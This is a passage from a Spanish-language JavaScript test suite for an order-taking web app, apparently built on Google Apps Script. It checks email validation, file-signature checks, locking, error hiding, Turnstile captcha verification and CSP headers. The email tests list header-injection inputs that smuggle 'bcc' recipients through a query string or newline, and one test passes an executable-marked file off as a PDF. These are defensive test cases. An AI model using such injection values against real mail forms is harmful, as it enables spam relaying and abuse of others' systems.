  ok(/ya se le escribió hoy/.test(s.mails[0].htmlBody), 'no aparece');
});

prueba('Correo: regla estricta (nada de ?bcc=, saltos de línea ni sin punto)', () => {
  const s = nuevo();
  ['ana@correo.com?bcc=jefe@x.com', 'ana@correo.com,otro@x.com', 'ana@correo', 'ana@correo.c', 'a b@correo.com', 'ana@correo.com\nbcc:x@y.zz', 'ana@@correo.com', '"ana"@correo.com', 'ana@correo.com>'].forEach(email => {
    const r = s.post(pedido(s, conCliente({ email }))); ok(!r.ok && /correo/i.test(r.error), email + ' -> ' + JSON.stringify(r));
  });
  ['ana.l+pehn@correo.com.hn', 'a_b-c%d@sub.dominio.org'].forEach(email => ok(s.post(pedido(s, conCliente({ email, phone: '9' + Math.random().toString().slice(2, 9) }))).ok, email));
  ok(s.hoja('Pedidos').length === 2);
});

prueba('Admin.html: los mailto: codifican el correo (CN-012)', () => {
  ok(!/mailto:\$\{esc\(/.test(leerGs('Admin.html')), 'mailto con esc()');
  ok((leerGs('Admin.html').match(/mailto:\$\{encodeURIComponent\(/g) || []).length === 2);
});

prueba('Archivos: la firma de bytes debe coincidir con el tipo declarado', () => {
  const s = nuevo();
  const falso = t => `data:${t};base64,` + bytes('esto no es una imagen');
  ['image/png', 'image/jpeg', 'image/webp', 'application/pdf'].forEach(t => ok(s.run(`dataUrlValido_(${JSON.stringify(falso(t))})`) === null, t + ' falso aceptado'));
  [JPG, PNG, WEBP, PDF].forEach(u => ok(s.run(`dataUrlValido_(${JSON.stringify(u)})`) !== null, u.slice(0, 22) + ' válido rechazado'));
  // un JPG real con etiqueta de PNG tampoco pasa
  ok(s.run(`dataUrlValido_(${JSON.stringify(JPG.replace('image/jpeg', 'image/png'))})`) === null);
  // WEBP: "RIFF" solo no basta
  ok(s.run(`dataUrlValido_(${JSON.stringify('data:image/webp;base64,' + bytes('RIFF\u0000\u0000\u0000\u0000WAVEfmt '))})`) === null);
});

prueba('Archivos: un PNG con bytes falsos como comprobante rechaza el pedido; como imagen se ignora', () => {
  const s = nuevo();
  const falso = 'data:image/png;base64,' + bytes('hola, no soy un png');
  const r = s.post(pedido(s, { comprobante: falso }));
  ok(!r.ok && /comprobante/.test(r.error) && s.hoja('Pedidos').length === 0, JSON.stringify(r));
  const t = sinAnticipo(); const b = pedido(t, { comprobante: '' }); b.items[0].images = [falso, PNG];
  ok(t.post(b).ok);
  ok(t.hoja('Partidas')[0]['Imágenes del cliente'].split('\n').filter(Boolean).length === 1, 'solo el PNG real debe guardarse');
});

prueba('Archivos: comprobante falso en Mis pedidos se rechaza y no escribe en Pagos', () => {
  const s = sinAnticipo(); const id = s.post(pedido(s, { comprobante: '' })).id;
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: 'data:application/pdf;base64,' + bytes('MZ-ejecutable') });
  ok(!r.ok && s.hoja('Pagos').length === 0, JSON.stringify(r));
  ok(s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: PDF }).ok, 'PDF real debe pasar');
});

prueba('Candado: Drive, OCR y correo corren fuera del candado; la carpeta se renombra con el ID', () => {
  const s = nuevo(); let sujeto = false; const dentro = [];
  const base = s.ctx.LockService.getScriptLock;
  s.ctx.LockService.getScriptLock = () => { const l = base(); return { tryLock: () => { sujeto = true; return l.tryLock(); }, releaseLock: () => { sujeto = false; l.releaseLock(); } }; };
  const ocr = s.ctx.Drive.Files.create; s.ctx.Drive.Files.create = (...a) => { if (sujeto) dentro.push('OCR'); return ocr(...a); };
  const mail = s.ctx.MailApp.sendEmail; s.ctx.MailApp.sendEmail = m => { if (sujeto) dentro.push('correo'); return mail(m); };
  const raiz = s.run('folder_()'), crear = raiz.createFolder;
  raiz.createFolder = n => { const f = crear(n); const cf = f.createFile; f.createFile = b => { if (sujeto) dentro.push('Drive'); return cf(b); }; return f; };
  const r = s.post(pedido(s)); ok(r.ok, JSON.stringify(r));
  ok(!dentro.length, 'dentro del candado: ' + dentro.join(', '));
  const url = s.hoja('Pedidos')[0].Carpeta, carpeta = s.ctx.DriveApp.getFolderById(url.split('/').pop());
  ok(carpeta.name.startsWith(r.id + ' · '), carpeta.name);
  ok(s.hoja('Pedidos')[0]['Correo cliente'] === 'Enviado' && s.hoja('Pagos').length === 1);
});

prueba('Candado: si el pedido falla, la carpeta temporal va a la papelera y nada queda en la hoja', () => {
  const s = nuevo(); let carpeta;
  const raiz = s.run('folder_()'), crear = raiz.createFolder;
  raiz.createFolder = n => { carpeta = crear(n); carpeta.setTrashed = () => { carpeta.papelera = true; }; return carpeta; };
  s.run(`consumoDePedido_ = () => { throw new Error('fallo interno'); }`);
  ok(!s.post(pedido(s)).ok && s.hoja('Pedidos').length === 0);
  ok(carpeta && carpeta.papelera === true, 'la carpeta quedó huérfana');
});

prueba('Errores: al sitio solo llegan mensajes conocidos; el resto es genérico', () => {
  const s = nuevo();
  s.run(`consumoDePedido_ = () => { throw new Error('Falta la hoja "Inventario" SKU-123 token=ABC'); }`);
  const r = s.post(pedido(s)); ok(!r.ok && !/Inventario|SKU|ABC/.test(r.error), r.error);
  ok(/No se pudo procesar/.test(r.error));
  ok(/Token inválido/.test(s.post({ ...pedido(s), token: 'x' }).error), 'los conocidos se conservan');
  ok(/Faltan datos/.test(s.post(pedido(s, conCliente({ name: '' }))).error));
});

prueba('Errores: cada mensaje de limite_/throw de Orders y Pagos que ve el cliente está en la lista pública', () => {
  const lista = JSON.parse(JSON.stringify(nuevo().run('MENSAJES_PUBLICOS')));
  const fuente = leerGs('Orders.gs') + leerGs('Pagos.gs');
  const msgs = [...fuente.matchAll(/(?:throw new Error|limite_\([^\n]*?,)\s*\(?'([^'\n]+)'/g)].map(m => m[1]);
  ok(msgs.length > 15, 'regex no encontró mensajes: ' + msgs.length);
  const faltan = msgs.filter(m => !lista.includes(m) && m !== 'ya' && !/^(Cambios|Formato|Demasiado grande)/.test(m));
  ok(!faltan.length, 'faltan en MENSAJES_PUBLICOS: ' + faltan.join(' | '));
});

// ---------- Turnstile (opcional) ----------
prueba('Turnstile: sin TURNSTILE_SECRET todo sigue como hoy (no se consulta a Cloudflare)', () => {
  const s = nuevo(); const r = s.post(pedido(s)); ok(r.ok, JSON.stringify(r));
  ok(s.red.llamadas.length === 0, 'consultó a Cloudflare');
});

prueba('Turnstile: con secreto, el token malo, vacío o sin respuesta rechaza el pedido', () => {
  const s = nuevo({ propiedades: { TURNSTILE_SECRET: 'sec-123' } });
  s.red.responder = () => ({ success: false, 'error-codes': ['invalid-input-response'] });
  const r = s.post(pedido(s, { turnstile: 'token-malo' }));
  ok(!r.ok && /Verificación fallida/.test(r.error) && s.hoja('Pedidos').length === 0, JSON.stringify(r));
  ok(s.red.llamadas.length === 1 && s.red.llamadas[0].url === 'https://challenges.cloudflare.com/turnstile/v0/siteverify');
  ok(s.red.llamadas[0].o.payload.secret === 'sec-123' && s.red.llamadas[0].o.payload.response === 'token-malo');
  ok(!s.post(pedido(s)).ok && s.red.llamadas.length === 1, 'sin token ni se consulta');
  ok(!s.post(pedido(s, { turnstile: { x: 1 } })).ok);
  s.red.responder = () => { throw new Error('sin red'); };
  ok(!s.post(pedido(s, { turnstile: 'cualquiera' })).ok, 'sin respuesta de Cloudflare debe rechazar');
  ok(s.hoja('Pedidos').length === 0);
});

prueba('Turnstile: con secreto y token bueno el pedido pasa', () => {
  const s = nuevo({ propiedades: { TURNSTILE_SECRET: 'sec-123' } });
  s.red.responder = () => ({ success: true });
  const r = s.post(pedido(s, { turnstile: 'token-bueno' })); ok(r.ok, JSON.stringify(r));
  ok(s.hoja('Pedidos').length === 1);
});

prueba('_headers: Turnstile permitido solo en script-src y frame-src; datos.js lo trae vacío', () => {
  const h = fsx.readFileSync(pathx.join(__dirname, '..', '_headers'), 'utf8');
  const dir = n => (h.match(new RegExp(n + ' ([^;]*)')) || [])[1] || '';
  ok(/challenges\.cloudflare\.com/.test(dir('script-src')) && /challenges\.cloudflare\.com/.test(dir('frame-src')));
  ok(!/challenges\.cloudflare\.com/.test(dir('default-src')) && !/unsafe-inline|unsafe-eval/.test(dir('script-src')));
  ok(/turnstileSiteKey: ''/.test(fsx.readFileSync(pathx.join(__dirname, '..', 'datos.js'), 'utf8')), 'datos.js debe traer la llave vacía');
});

console.log(`\n${n - fallas} de ${n} pruebas pasaron.`);
process.exit(fallas ? 1 : 0);
